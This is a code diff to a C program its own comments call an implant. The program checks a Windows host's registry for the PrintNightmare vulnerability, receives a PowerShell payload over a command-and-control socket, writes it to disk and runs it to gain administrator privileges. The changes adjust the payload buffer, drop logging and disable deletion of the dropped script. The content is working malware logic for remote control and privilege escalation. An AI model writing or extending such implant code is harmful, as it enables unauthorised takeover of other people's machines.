@@ -138,7 +138,6 @@ end:
 
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
-// TODO: could refactor with goto + return value variable
 int check_registry_for_privesc() {
     int vulnerable = 1;
     DWORD status;
@@ -199,7 +198,7 @@ char* DownloadScript() {
     }
 
     // Allocate buffer for payload data
-    payload_data = HeapAlloc(heap, 0, 250*1000); // Allocate 250 Kb to be safe
+    payload_data = HeapAlloc(heap, 0, 200*1000); // Allocate 200 Kb to be safe
     if (payload_data == NULL) {
         HeapFree(heap, 0, payload_path);
         return NULL;
@@ -216,8 +215,7 @@ char* DownloadScript() {
     }
 
     // Receive payload
-    int len = c2_recv(c2_sock, payload_data, 250*1000);
-    printf("[*] Payload size: %d bytes\n", len);
+    int len = c2_recv(c2_sock, payload_data, 200*1000);
 
     // Write paylaod
     if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
@@ -236,6 +234,8 @@ char* DownloadScript() {
 
 // Attempts to gain administrator privileges via the Printer Nightmare CVE.
 // Works by downloading and executing a powershell script.
+// TODO: issue is that recv function cannot receive all the data in a single call.
+//        Need to receive in a loop to get all data.
 DWORD escalate() {
     char* script_path;
     STARTUPINFO startInfo;
@@ -282,7 +282,7 @@ DWORD escalate() {
 
 end:
     if (script_path) {
-        DeleteFile(script_path);
+        //DeleteFile(script_path); // TODO uncomment
         HeapFree(heap, 0, script_path);
     }
     return ret;
@@ -324,8 +324,6 @@ int main() {
         len = c2_recv(c2_sock, buffer, 511);
         if (len == SOCKET_ERROR)
             continue;
-        c2_log("%s\n", buffer);
-
 
 
         // Main logic of implant functionality
